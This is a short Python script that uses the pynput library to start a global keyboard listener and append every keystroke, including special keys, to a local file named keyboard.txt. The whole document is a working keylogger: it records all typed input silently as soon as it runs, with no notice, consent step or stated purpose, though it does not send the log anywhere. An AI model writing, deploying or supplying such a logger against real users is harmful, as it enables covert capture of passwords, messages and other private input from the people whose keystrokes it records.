from pynput import mouse, keyboard


def keyboard_log(key):
    with open("keyboard.txt", "a+") as keylog:
        if type(key) == keyboard._win32.KeyCode:
            x = key.char
        else:
            x = ' \n\t' + str(key) + ' \n'
        keylog.write(str(x))


def keyboard_start():
    with keyboard.Listener(on_press=keyboard_log) as lstn:
        lstn.join()


keyboard_start()

